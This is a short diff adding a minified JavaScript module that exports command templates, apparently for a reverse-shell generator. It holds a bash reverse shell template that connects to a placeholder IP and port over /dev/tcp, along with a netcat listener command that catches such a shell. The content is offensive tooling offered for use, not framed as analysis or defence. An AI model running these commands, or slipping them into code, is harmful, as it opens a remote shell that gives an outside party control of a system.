@@ -1,0 +1,1 @@
+const e=[{title:"Bash Reverse Shell - Basic TCP",template:"sh -i >& /dev/tcp/{ip}/{port} 0>&1"},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
